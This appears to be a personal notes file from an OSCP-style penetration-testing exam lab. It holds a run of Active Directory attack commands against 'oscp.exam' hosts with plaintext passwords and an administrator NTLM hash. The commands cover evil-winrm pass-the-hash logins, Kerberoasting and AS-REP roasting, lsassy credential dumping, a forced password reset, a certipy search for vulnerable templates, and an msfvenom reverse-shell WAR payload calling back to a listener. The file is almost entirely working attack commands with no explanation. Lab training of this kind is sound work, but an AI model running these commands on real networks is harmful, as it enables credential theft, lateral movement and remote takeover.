
![[oscp_cheatsheet_3.html]]
evil-winrm -i 172.16.91.200 -u 'b.martin' -p 'MartiniAllNight222'
evil-winrm -i 172.16.91.202 -u 'b.martin' -p 'MartiniAllNight222'
evil-winrm -i 172.16.91.202 -u 'r.andrews' -p 'BusyOfficeWorker890'
evil-winrm -i 192.168.91.206 -u 'r.andrews' -p 'BusyOfficeWorker890'

evil-winrm -i 192.168.91.206 -u '4leaf' -p 'a123a123!@'
evil-winrm -i 192.168.91.206 -u 'administrator' -H '3687f62e3dfb4b4f1fde5fe575df55d6' 
evil-winrm -i 172.16.91.200 -u 'administrator' -H '3687f62e3dfb4b4f1fde5fe575df55d6' 
evil-winrm -i 172.16.91.202 -u 'administrator' -H '3687f62e3dfb4b4f1fde5fe575df55d6' 



bloodhound-python -d 'DC20.oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890' -ns 172.16.91.200 -c All --zip
impacket-GetNPUsers DC20.oscp.exam/ -dc-ip DC20.oscp.exam -request


./kerbrute_linux_amd64 userenum /home/kali/OSCP_EXAM/192.168.91.206/users.txt --dc DC20.oscp.exam -d oscp.exam

nxc smb 172.16.91.200 -u 'r.andrews' -p 'BusyOfficeWorker890' --shares

nxc smb 172.16.91.200 -u users.txt - 'BusyOfficeWorker890' --shares

impacket-GetUserSPNs -request -dc-ip 172.16.91.200 oscp.exam/b.martin:MartiniAllNight222

nxc smb 172.16.91.200 -u 'b.martin' -p 'MartiniAllNight222' -M lsassy
nxc smb 172.16.91.200 -u 'r.andrews' -p 'BusyOfficeWorker890' --shares

net rpc password "g.jarvis" -U "oscp.exam/r.andrews"%"BusyOfficeWorker890" -S "172.16.91.200"

bloodhound-python -d 'oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890' -c All -ns 172.16.91.200 --zip


certipy-ad find -vulnerable -u 'b.martin' -p 'MartiniAllNight222' -dc-ip 172.16.91.200 -target-ip 172.16.91.200

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.91 LPORT=4444 -f war > shell.war

nxc smb 192.168.91.206 -u '4leaf' -p 'a123a123!@' -M powershell_history --local-auth
nxc smb 192.168.91.206 -u 'administrator' -H '3687f62e3dfb4b4f1fde5fe575df55d6' -M powershell_history --local-auth






